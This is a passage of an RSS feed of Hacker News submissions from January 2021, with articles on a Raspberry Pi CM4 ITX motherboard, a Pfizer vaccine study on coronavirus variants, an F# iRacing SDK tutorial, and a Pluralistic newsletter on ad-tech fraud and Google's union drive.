            <guid isPermaLink="false">hacker-news-small-sites-25698520</guid>
            <pubDate>Sat, 09 Jan 2021 07:57:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Over: Board – Raspberry Pi CM4 ITX Motherboard]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25697993">thread link</a>) | @todsacerdoti
<br/>
January 8, 2021 | https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3401">

	

	<div>
		
<p>The Over:Board is an IO board for the Raspberry Pi Compute Module 4. It is designed to use a standard PC ATX power connector and features a full size PCI-E 16x slot although its only running at 1x bandwidth and unfortunately it is not compatible with a GPU.   <br></p>



<figure><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201%201'%3E%3C/svg%3E" data-src="https://c0.iggcdn.com/indiegogo-media-prod-cld/image/upload/c_fill,w_762,g_center,q_auto:best,dpr_1.6,f_auto,h_506/fjlirebv3qpqd7xdlsek" alt="The Over:Board" data-old-src="https://c0.iggcdn.com/indiegogo-media-prod-cld/image/upload/c_fill,w_762,g_center,q_auto:best,dpr_1.6,f_auto,h_506/fjlirebv3qpqd7xdlsek" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The Over:Board</figcaption></figure>



<p><br>It breaks out the following ports: <br></p>



<ul><li>24-pin ATX Power</li><li>40-pin GPIO</li><li>Full Size PCI-E @ 1x bandwidth</li><li>SATA Controller (Powered by USB)</li><li>Front Panel Header</li><li>CPU Fan Header</li><li>UART Header</li><li>Micro USB</li><li>RS232 Com Port</li><li>2x USB 2.0 Ports</li><li>Micro SD card slot</li><li>3.5mm Audio</li></ul>



<p>The Over:Board costs £199 for an early prototype or £99 for the Final Production board and is available to back now on indiegogo. <br></p>



<div><p>Whilst £99 is expensive for a IO board this is likely down to the limited production and it is likely still the cheapest ARM based ITX motherboard on the market even when factoring in the cost of a RPI CM4. </p><p>You can back the Over:Board on indiegogo <a rel="noreferrer noopener" href="https://www.indiegogo.com/projects/over-board-raspberry-pi-4-mini-itx-motherboard#/" target="_blank">here</a></p><p>For another ARM IO board with SATA check out my Nano Pi Neo2 NAS review <a rel="noreferrer noopener" href="https://blog.jmdawson.co.uk/nano-pi-neo2-nas-enclosure-a-small-linux-home-server-nas/" target="_blank">here</a></p><p>The project currently has £1654 in backing from 11 backers. With 28 days left it is looking likely to hit its £5000 target. </p><p>Ross Nicoholls is leading the campaign: </p></div>



<blockquote><p>I’ve lost count exactly how many, but this will be about my 35th commercial electronics PCB to be manufactured, so I am no stranger to getting these things to market. That said however, this will be the first of my own venture so represents my most exciting project to date and something I feel very passionate about.</p><cite>Ross has lots of experience in this field</cite></blockquote>



<p>I wish Ross good luck and hope to see the Over:Board available soon! </p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25697993</guid>
            <pubDate>Sat, 09 Jan 2021 06:31:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pfizer vaccine appears effective against mutation in new coronavirus variants]]>
            </title>
            <description>
<![CDATA[
Score 629 | Comments 227 (<a href="https://news.ycombinator.com/item?id=25696577">thread link</a>) | @awnird
<br/>
January 8, 2021 | https://www.cbc.ca/news/health/pfizer-biontech-vaccine-appears-effective-against-mutation-in-new-coronavirus-variants-study-suggests-1.5865885 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/health/pfizer-biontech-vaccine-appears-effective-against-mutation-in-new-coronavirus-variants-study-suggests-1.5865885">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Pfizer Inc. and BioNTech's COVID-19 vaccine appeared to work against a key mutation in the highly transmissible new variants of the coronavirus discovered in Britain and South Africa, according to a laboratory study conducted by the U.S. drugmaker.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5852149.1608672062!/cumulusImage/httpImage/image.jpg_gen/derivatives/16x9_780/covid-vaccinations-toronto.jpg"></p></div><figcaption>A nurse prepares a dose of the Pfizer-BioNTech COVID-19 vaccine for care home workers at St. Michael’s Hospital in Toronto on Dec. 22, 2020.<!-- --> <!-- -->(Evan Mitsui/CBC)</figcaption></figure><p><span><p>Pfizer Inc. and BioNTech's COVID-19 vaccine appeared to work against a key mutation in the highly transmissible new variants of the coronavirus discovered in Britain and South Africa, according to a laboratory study conducted by the U.S. drugmaker.</p>  <p>The study by Pfizer and scientists from the University of Texas Medical Branch, which has not yet been peer-reviewed, indicated the vaccine was effective in neutralizing virus with the so-called N501Y mutation of the spike protein.</p>  <p>The mutation could be responsible for greater transmissibility and there had been concern it could also make the virus escape antibody neutralization elicited by the vaccine, said Phil Dormitzer, one of Pfizer's top viral vaccine scientists.</p>  <p>The first results of tests on the variants offer a glimmer of hope while more studies are carried out as Britain and other countries try to tame the more infectious variants that&nbsp;authorities believe are driving a surge in infections that could overwhelm health-care systems.</p>  <p>The Pfizer-BioNTech study was conducted on blood taken from people who had been given the vaccine. Its findings are limited because it does not look at the full set of mutations found in either of the new variants of the rapidly spreading virus.</p>  <p>Dormitzer said it was encouraging that the vaccine appears effective against the mutation, as well as 15 other mutations the company has previously tested against.</p>  <p>"So we've now tested 16 different mutations, and none of them have really had any significant impact. That's the good news," he said. "That doesn't mean that the 17th won't."</p>  <p><em><strong>WATCH | What scientists know about the new coronavirus variant:</strong></em></p>  <p><span><span><div><div title="What scientists know about the new coronavirus variant" role="button" tabindex="0"><div><div aria-labelledby="1842141251676-metadata-" title="What scientists know about the new coronavirus variant"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/643/819/COVID-VARIANT-SCI-BIRAK-080121.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>The B1-17 coronavirus variant, first discovered in the U.K., is now in at least 40 countries, including Canada. It has 23 mutations, including one that attaches to healthy cells like a key going into a lock.<!-- --> <!-- -->1:56</span></span></span></p>  <p>Dormitzer said another mutation found in the South African variant, called the E484K mutation, was also concerning.</p>  <p>The researchers plan to run similar tests to establish whether the vaccine is effective against other mutations found in the British and South African variants and hope to have more data within weeks.</p>  <p>The variants are said by scientists to be more transmissible than previously dominant ones, but they are not thought to cause more serious illness.</p>  <p>The virus's spikes act as a key that must unlock our cells to cause the infection.&nbsp;The variant first identified in the U.K. has a mutation that appears to make it easier for the coronavirus to grab hold of the lock more tightly, scientists say.</p>    <p>Scientists said the results of the study would help calm concerns that people will not be protected by vaccines being given to millions of people around the world in the fight against the pandemic, which has killed more than 1.8 million people and roiled economies.</p>  <p>But they cautioned that more clinical tests and data are still needed to come to a definitive conclusion.</p>  <p>"This is good news, mainly because it is not bad news," said Stephen Evans, professor of pharmacoepidemiology at the&nbsp;London School of Hygiene &amp; Tropical Medicine.</p>  <p>"So, yes this is good news, but it does not yet give us total confidence that the Pfizer (or other) vaccines will definitely give protection."</p>  <h2>AstraZeneca, Moderna, CureVac testing against variants</h2>  <p>AstraZeneca, Moderna and CureVac are also testing whether their shots work against the fast-spreading variants. They have said they expect them to be effective, but the timing of those studies is not known.</p>  <p>A senior British lawmaker expressed concerns in an interview on Friday that COVID-19 vaccines might not work properly against the South African variant. He was not responding to questions about Friday's data.</p>  <p>The Pfizer-BioNTech vaccine and the one from Moderna Inc., which use synthetic messenger RNA technology, can be quickly tweaked to address new mutations of a virus if necessary. Scientists have suggested the changes could be made in as little as six weeks.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/virus-outbreak-new-variants.jpg 300w,https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/virus-outbreak-new-variants.jpg 460w,https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/virus-outbreak-new-variants.jpg 620w,https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/virus-outbreak-new-variants.jpg 780w,https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/virus-outbreak-new-variants.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5866498.1610132224!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/virus-outbreak-new-variants.jpg"></p></div><figcaption>Graphic shows a diagram of the COVID-19 virus.<!-- --> <!-- -->(AP)</figcaption></figure></span></p>  <p>Some other vaccines to protect against COVID-19 also use the spike protein to show our immune system what the enemy looks like.</p>  <p>Canadian microbiologist Benjamin tenOever, a professor at the&nbsp;Icahn School of Medicine at Mount Sinai in New York,&nbsp;said our immune system learns to recognize and attack the viral attachment protein at many different sites.</p>  <p>"It would require many many mutations to render our vaccines non-effective,"&nbsp;tenOever&nbsp;said.</p>  <p>The variant is also not the first of the pandemic to emerge and Eleanor Riley, professor of immunology and infectious disease at the University of Edinburgh, said these types of studies&nbsp;will be needed as they appear.</p>  <p>"It may be necessary to tweak the vaccine over time," she said.</p>  <p>Dr. Theresa Tam, Canada's chief public health officer, said Friday that 14 cases of the variant first reported in the U.K. have been reported in Canada.</p>  <p>Researchers in Ontario have developed a faster test to identify variants.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/health/pfizer-biontech-vaccine-appears-effective-against-mutation-in-new-coronavirus-variants-study-suggests-1.5865885</link>
            <guid isPermaLink="false">hacker-news-small-sites-25696577</guid>
            <pubDate>Sat, 09 Jan 2021 03:48:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing an iRacing SDK Implementation in F#]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25696493">thread link</a>) | @sanesmith
<br/>
January 8, 2021 | https://markjames.dev/2021-01-08-writing-an-iracing-sdk-implementation-fsharp/ | <a href="https://web.archive.org/web/*/https://markjames.dev/2021-01-08-writing-an-iracing-sdk-implementation-fsharp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>In my <a href="https://markjames.dev/2021-01-04-why-learning-fsharp-2021/">previous post</a>, I discussed how I’ve decided to learn F# in 2021 for a number of reasons. Around the same time, I also happened to setup my Sim Racing rig so that I could continue to play <a href="https://www.iracing.com/" target="_blank">iRacing</a> with my VR headset (HTC Vive). Its been several years since I’ve last played, but with COVID-related curfews being implemented here in Montreal tomorrow, I’ve been increasingly taking up home-based pursuits which I didn’t always have the time for pre-lockdown. Since the last time I played iRacing, I’m running a PC with a much better processor, motherboard, and only SSDs. The VR performance has been a huge leap forward since I used to play with my old machine and I was quite impressed. After spending a couple of hours setting up, here’s what my current humble racing setup looks like:</p>

<p><img src="https://markjames.dev/img/posts/irsdk-fsharp/racing-rig.jpg" width="650" height="488" alt="Photo of my current iRacing VR setup"></p>

<p>Having a dedicated table really helps, as in my old apartment it was fairly difficult to setup a station with limited space, but now I can fortunately just jump in. Despite the past limitations, I was able to get fairly competitive and still remember the thrill of my first win agaisnt a field of real racers in a Mazda MX-5:</p>

<p><img src="https://markjames.dev/img/posts/irsdk-fsharp/iracing-win.jpg" width="500" height="279" alt="Photo of my iRacing first win certificate"></p>

<p>Inspired by setting everything up and doing some laps to practice for an eventual return to comeptition, I started thinking about how I once experimented with using the <a href="https://github.com/kutu/pyirsdk" target="_blank">Python implementation</a> of the iRacing SDK to connect to an arduino and display a speedometer readout in realtime on a small screen. In reminiscing about the experience, I thought about how I could look into writing an F# implementation of the SDK as a learning project. In addition to learning through the project, it also has the benefit of being of use in a future project involving an iRacing stats tracker web app that I’ve been thinking about writing as a project for my upcoming <a href="https://markjames.dev/2020-12-09-back-to-school/">cloud computing courses</a>.</p>

<h2 id="getting-started">Getting Started</h2>

<p>I tend to learn best when projects are slightly outside of my comfort zone, and this would be both my first time writing a library, as well as writing one in a functional language! Having used an array of libraries at this point, I had some confidence in choosing an organizational structure, and the Python implementation is only <a href="https://github.com/kutu/pyirsdk/blob/master/irsdk.py" target="_blank">739 lines of code</a> which felt doable compared to some of the larger libraries out there.</p>

<p>Moreover, the python implementation of the SDK has the ability to:</p>

<ul>
  <li>Get session data (WeekendInfo, SessionInfo, etc…)</li>
  <li>Get live telemetry data (Speed, FuelLevel, etc…)</li>
  <li>Broadcast messages (camera, replay, chat, pit and telemetry commands)</li>
</ul>

<p>and I figured that this would be a good featureset to aim for in the final version of the F# SDK. Out of these features, the session data and live telemetry data would be the ones I plan to implement first.</p>

<h2 id="creating-the-library">Creating the Library</h2>

<p>After coming up with some desired features, the first step was to create a new FSharp solution called iRacingFSharp. Inside the solution, I created two projects. One was our actual library, called iRacingFSharp, and the other was a basic console app called SDKReader (located in the Examples Folder) to test the functionality of the library as I worked on it. Note, if you’d like to see the full codebase you can <a href="https://github.com/markjamesm/irsdk-fsharp" target="_blank">here on github</a>.</p>

<h2 id="the-first-function">The First Function</h2>

<p>Starting small, I decided that a good first function would be to find out the state of the simulator. Fortunately, the iRacing SDK allows you to check if the sim is running using the following URL which points to a localhost server:</p>

<div><div><pre><code>http://127.0.0.1:32034/get_sim_status?object=simStatus
</code></pre></div></div>
<p>Getting this URL in Postman returns a JSON object which looks like this:</p>

<div><div><pre><code>var simStatus={
   running:0 // 1 if the sim is running
};
</code></pre></div></div>

<p>I decided to make use of the <a href="https://fsharp.github.io/FSharp.Data/library/Http.html" target="_blank">F# Data HTTP library</a> in order to download the response and so I installed it from NuGet at this point.</p>

<p>Next, inside my iRacingFSharp project I created a file called Irsdk.fs and wrote the following code:</p>

<div><div><pre><code><span>namespace</span> <span>IrsdkFS</span>

<span>open</span> <span>FSharp</span><span>.</span><span>Data</span>

<span>///&lt;summary&gt;F# implementation of the iRacing SDK.&lt;/summary&gt;</span>
<span>module</span> <span>IrsdkFS</span> <span>=</span>

    <span>///&lt;summary&gt;Returns the simStatus in string format&lt;/summary&gt;</span>
    <span>let</span> <span>SimStatus</span><span>()</span> <span>=</span>
        <span>let</span> <span>simStatusURL</span> <span>=</span> <span>"http://127.0.0.1:32034/get_sim_status?object=simStatus"</span>
        <span>let</span> <span>simStatusObject</span> <span>=</span> <span>Http</span><span>.</span><span>RequestString</span><span>(</span><span>simStatusURL</span><span>)</span>
        <span>simStatusObject</span>
</code></pre></div></div>

<p>In the above code, I’ve created a module which contains a function called SimStatus that takes no parameters. It then binds the JSON response to simStatusURL and passes it to the HTTP library via Http.RequestString(). Finally, simStatusObject is returned in string format which can be parsed further by another function in a later step.</p>



<p>With this simple function in place, the next step was to create SDKReader.fs inside my SDKReader console app. This file contained code to call the SimStatus() function and print the output:</p>

<div><div><pre><code><span>[&lt;</span><span>EntryPoint</span><span>&gt;]</span>
<span>let</span> <span>main</span> <span>argv</span> <span>=</span>
    <span>let</span> <span>test</span> <span>=</span> <span>IrsdkFS</span><span>.</span><span>SimStatus</span><span>()</span>
    <span>printf</span> <span>"%s"</span> <span>test</span>
    <span>0</span> <span>// return an integer exit code</span>
</code></pre></div></div>

<p>Running dotnet build inside the SDKReader folder displayed the following output while iRacing was running:</p>

<div><div><pre><code><span>"var simStatus={
   running:1
};
"</span><span>
</span></code></pre></div></div>

<p>Success! With this method working, we now have the very beginnings of an F# implementation of the iRacing SDK! Although it is a small step, we were also able to create and structure the project. Lastly, I also setup a a basic .NET build through Github Actions for CI.</p>



<p>iRacing’s API telemetry comes in three variations; data written to a .ibt file 60 times a second, live data exposed to the telemetry API 60 times per second, and a session string in YAML format that contains more or less static information about the session. The YAML string is appended to the end of the .ibt file but only a small portion of that data is exposed. This means that going forward, I’ll need to look into parsing the YAML as well as mapping more of the API endpoints. The iRacing API appears to be nonstandard and so it may take a little more work than just a typical REST API.</p>

<p>Stay tuned for Part Two where I plan to implement some telemetry functions and look into parsing the aforementioned YAML. In addition, be sure to follow along with the <a href="https://github.com/markjamesm/irsdk-fsharp" target="_blank">Github Repo here</a> if you’re interested in seeing how to project progresses (or would like to contribute)!</p>

      </article></div>]]>
            </description>
            <link>https://markjames.dev/2021-01-08-writing-an-iracing-sdk-implementation-fsharp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25696493</guid>
            <pubDate>Sat, 09 Jan 2021 03:42:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ad-Tech Is a Bezzle]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25695482">thread link</a>) | @freediver
<br/>
January 8, 2021 | https://pluralistic.net/2021/01/04/how-to-truth/#adfraud | <a href="https://web.archive.org/web/*/https://pluralistic.net/2021/01/04/how-to-truth/#adfraud">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1719">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
reviews, damon knight, science fiction, statistics, statistical literacy, gift guide,books, uk, dsa, democratic socialists of america, elections, california, ads, at-tech, fraud, google, labor, unions, alphabet, alphabet workers union, cwa,

Summary:
Ad-tech is a bezzle; Google's unionizing; The Data Detective; Damon Knight's Why Do Birds is back; Endorsing the Forward 43 slate

URL:
https://pluralistic.net/2021/01/04/how-to-truth/

Title:
Pluralistic: 04 Jan 2021

Bullet:
🎬

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Ken Snider (https://twitter.com/orenwolf), Slashdot (https://slashdot.org/), Margo Rowder (https://twitter.com/margorowder).

--><br>
<a href="https://pluralistic.net/2021/01/04/how-to-truth/"><img src="https://i0.wp.com/craphound.com/images/04Jan2021.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/04Jan2021.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#adfraud">Ad-tech is a bezzle</a>: The subprime attention crisis is upon us.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#awu">Google's unionizing</a>: Solidarity vs worker misclassification.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#harford">The Data Detective</a>: How to truth with statistics.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#an-oval">Damon Knight's Why Do Birds is back</a>: Reviving a grand master's comic masterpiece.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#fwd-43">Endorsing the Forward 43 slate</a>: For my California comrades.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#retro">This day in history</a>: 2016
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2021/01/04/how-to-truth/#bragsheet">Colophon</a>: Recent publications, upcoming/recent appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="adfraud"></a><br>
<img src="https://i1.wp.com/craphound.com/images/ad-3242595_960_720.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/ad-3242595_960_720.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>There are lots of problems with ad-tech:</p>
<ul>
<li>being spied on all the time means that the people of the 21st century are less able to be their authentic selves;
</li>
<li>
<p>any data that is collected and retained will eventually breach, creating untold harms;</p>
</li>
<li>
<p>data-collection enables for discriminatory business practices ("digital redlining");</p>
</li>
<li>
<p>the huge, tangled hairball of adtech companies siphons lots (maybe even most) of the money that should go creators and media orgs; and</p>
</li>
<li>
<p>anti-adblock demands browsers and devices that thwart their owners' wishes, a capability that can be exploited for even more nefarious purposes;</p>
</li>
</ul>
<p>That's all terrible, but it's also <em>ironic</em>, since it appears that, in addition to everything else, ad-tech is a fraud, a bezzle.</p>
<p>Bezzle was John Kenneth Galbraith's term for "the magic interval when a confidence trickster knows he has the money he has appropriated but the victim does not yet understand that he has lost it." That is, a rotten log that has yet to be turned over.</p>
<p>Bezzles unwind slowly, then all at once. We've had some important peeks under ad-tech's rotten log, and they're increasing in both intensity and velocity. If you follow Aram Zucker-Scharff, you've had a front-row seat to the fraud.</p>
<p><a href="https://twitter.com/Chronotope/status/1078003966863200256">https://twitter.com/Chronotope/status/1078003966863200256</a></p>
<p>Time and again, everything in the ad-tech stack has been demonstrated to be fraudulent: fake audiences firing fake clicks at fake videos on fake sites that suck real dollars out of advertisers' accounts.</p>
<p>This was masterfully elucidated in Tim Hwang's short 2020 book SUBPRIME ATTENTION CRISIS, whose thesis is: we must deflate the ad-tech bubble intentionally, lest we get a messy rupture that destroys many of the good things the parasite has colonized.</p>
<p><a href="https://pluralistic.net/2020/10/05/florida-man/#wannamakers-ghost">https://pluralistic.net/2020/10/05/florida-man/#wannamakers-ghost</a></p>
<p>The ad-tech fraud is many-layered. On the surface, there's the counting frauds: fake clicks, fake sites, fake videos, etc. But there's a deeper fraud, a theory fraud, the fraud that with enough surveillance data and machine learning, ad-tech can sell anyone anything.</p>
<p>That is: even if we count accurately, ads are still overvalued and underperforming. This is also a lesson whose examples are coming with increasing tempo, as when Ebay simply stopped buying Google search ads and saw <em>no</em> decrease in sales.</p>
<p><a href="https://pluralistic.net/2020/12/06/surveillance-tulip-bulbs/#adtech-bubble">https://pluralistic.net/2020/12/06/surveillance-tulip-bulbs/#adtech-bubble</a></p>
<p>In a piece for Forbes, marketer-turned-antifraud-auditor Dr Augustine Fou rounds up some of the grossest things festering under the ad-tech log.</p>
<p><a href="https://www.forbes.com/sites/augustinefou/2021/01/02/when-big-brands-stopped-spending-on-digital-ads-nothing-happened-why/?sh=5a4f9c9a1166">https://www.forbes.com/sites/augustinefou/2021/01/02/when-big-brands-stopped-spending-on-digital-ads-nothing-happened-why/?sh=5a4f9c9a1166</a></p>
<p>Like that time in 2018 when Procter and Gamble – inventors of "brand marketing" – turned off $200m worth of ad-tech buys and saw no change to their sales. Or when Chase killed 95% of its advertising and kept all of its business.</p>
<p>Most interesting is the tale of how Uber allowed itself to be defrauded of $150m/year, for years, by ad-tech intermediaries. It's a story told in detail by former Uber head of "performance marketing" Kevin Frisch on the Marketing Today podcast:</p>
<p><a href="https://www.marketingtodaypodcast.com/194-historic-ad-fraud-at-uber-with-kevin-frisch/">https://www.marketingtodaypodcast.com/194-historic-ad-fraud-at-uber-with-kevin-frisch/</a></p>
<p>It starts with the revelation that $50m of its annual spend on customer acquisitions – money paid when an ad leads to a new Uber customer downloading the app, entering payment details and taking their first ride – was fraudulent.</p>
<p>Here's how that worked: scummy marketers fielded low-quality apps (like battery monitors) that requested root access. These apps spied on every app you installed. If you installed Uber, they "fired a click" to the system to report you as having been "converted" by an ad.</p>
<p>After clearing $50m of fraud, Frisch continued to dig into the system. In the end, about $120m of the $150m was being stolen, pocketed for fake clicks on fake sites by fake users.</p>
<p>In a fascinating turn, Frisch describes how his colleagues were indifferent or actively hostile to his efforts. Uber was in "growth mode," trying to beef up its numbers prior to the IPO where suckers would relieve its Saudi royal investors.</p>
<p>Uber is a company that will never, ever be profitable. It, too, is a bezzle. It only "works" if outside investors – marks – can somehow be convinced to buy the insiders' stock, which requires the appearance of growth – AKA "A pile of shit this big <em>must</em> have a pony under it!"</p>
<p>So execs like Frisch were required to "spend to budget" – to maintain the appearance of growth, including (especially) the growth of its "precision analytics" marketing, where ad-tech spends turned into directly attributable customer acquisitions.</p>
<p>This is the story that keeps on giving, because it all starts with Sleeping Giant's campaign to force Uber to stop advertising on Breitbart, and Uber's inability to get its ad-tech "partners" to definitively switch off Breitbart ads.</p>
<p><a href="https://twitter.com/nandoodles/status/1345774768746852353">https://twitter.com/nandoodles/status/1345774768746852353</a></p>
<p>The system's layers of misdirection – there to hide the fraud – meant that it behaved nondeterministically and couldn't fulfil simple requests, which triggered the search.</p>
<p>There's a theory that the reason Big Tech spies on us so much is that they're really good at turning data into sales (and, by extension, influence, as in elections, referenda, etc). But it is increasingly apparent that Big Tech's spying is part of a bezzle.</p>
<p>That is, we're being surveilled, doxed, placed under automated suspicion and digitally discriminated against all to put on a show that separates marks from their dollars.</p>
<p>This is the theme of my 2020 book HOW TO DESTROY SURVEILLANCE CAPITALISM:</p>
<p><a href="https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59">https://onezero.medium.com/how-to-destroy-surveillance-capitalism-8135e6744d59</a></p>
<p>Namely, that we are under constant surveillane because monopolies can get away with obviously fraudulent and dangerous conduct by mobilizing their monopoly profits to buy political outcomes that serve their ends.</p>
<p>This is also what happened with California's Proposition 22, the most expensive ballot initiative in US history: Uber didn't spearhead a $200m campaign to legalize worker misclassification to become profitable.</p>
<p>Uber will never be profitable.</p>
<p>All that money was spent to maintain the fiction, the fraud, the bezzle – it was an appeal to rescue the wholly fictional pony underneath that gigantic pile of shit.</p>
<hr>
<p><a name="awu"></a><br>
<img src="https://i1.wp.com/craphound.com/images/Homestead_Strike_-_Mob_attacking_Pinkerton_men-1-1-9.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/craphound.com/images/Homestead_Strike_-_Mob_attacking_Pinkerton_men-1-1-9.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Google workers have announced their intention to form a union, under the auspices of CWA Local 1440. The union is called The Alphabet Workers Union (Google maintains the legal and accounting fiction that it is a division of a holding company called "Alphabet").</p>
<p>Speaking of legal fictions, the union is opening membership to "TVCs" – temps, vendors and contractors – employees who have been deliberately misclassified so as to avoid paying them benefits or extending normal workplace protections to them.</p>
<p>It's a bold move, a countermeasure to thwart the other commercial advantage from worker misclassification: by creating multiple categories of workers, bosses can pit employees against one another, by dangling privileges in front of one group but not the other.</p>
<p>But it comes at a high price: to gain official legal recognition, more than 50% of eligible workers must join the union. By including more workers, the union is setting a higher bar for official status.</p>
<p><a href="https://www.vice.com/en/article/3an5q9/google-workers-publicly-launch-union">https://www.vice.com/en/article/3an5q9/google-workers-publicly-launch-union</a></p>
<p>But the union has momentum: a series of high-profile googler uprisings – driven by official tolerance for sexual misconduct, complicity in US military drone programs, secret collaboration with Chinese surveillance and censorship, and more – show how radicalized googlers are.</p>
<p>Google's management – who cultivated an air of participatory, cuddly collaboration – have arrived at a point where the contradictions between their "values" and the company's profits can no longer be reconciled.</p>
<p>In Dec 2020, Google fired Timnit Gebru, an eminent Black AI scientist who refused to retract a paper critical of its profitable Big Data research. Management compounded their sins by making false claims about Gebru's dismissal.</p>
<p>The unionization drive is under the CWA's #CODE (Coalition to Organize Digital Employees) project. Though CODE is no stranger to conflict, Google represents a serious challenge, thanks to its partnership with notorious union-busters IRI Consultants.</p>
<p>(IRI's tactics pale in comparison to the mercenaries that Amazon has hired to bust its unions: the Pinkerton company, who have spilled rivers of workers' blood in their murderous history):</p>
<p><a href="https://www.vice.com/en/article/5dp3yn/amazon-leaked-reports-expose-spying-warehouse-workers-labor-union-environmental-groups-social-movements">https://www.vice.com/en/article/5dp3yn/amazon-leaked-reports-expose-spying-warehouse-workers-labor-union-environmental-groups-social-movements</a></p>
<p>For important context on the drive, check out Collective Action in Tech's article on the announcement, which explains why googlers have formed a "non-contract union" that does not yet have official recognition.</p>
<p><a href="https://collectiveaction.tech/2021/the-abcs-of-googles-new-union/">https://collectiveaction.tech/2021/the-abcs-of-googles-new-union/</a></p>
<p>"Non-contract unions embody the idea that worker power does not come from legal processes, but rather through building power through solidarity."</p>
<hr>
<p><a name="harford"></a><br>
<img src="https://i0.wp.com/craphound.com/images/data-detective.png?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/data-detective.png?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>Publishing works on long schedules, which means that long-planned books can be overtaken by events…like covid.</p>
<p>2020 was tough for those of us with books in trail, especially nonfiction. But for a few lucky writers, covid imparted a terrible salience to their books.</p>
<p>One such writer is Tim Harford, host of BBC Radio 4's More or less, which is hands-down the greatest statistical literacy program in the world, …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://pluralistic.net/2021/01/04/how-to-truth/#adfraud">https://pluralistic.net/2021/01/04/how-to-truth/#adfraud</a></em></p>]]>
            </description>
            <link>https://pluralistic.net/2021/01/04/how-to-truth/#adfraud</link>
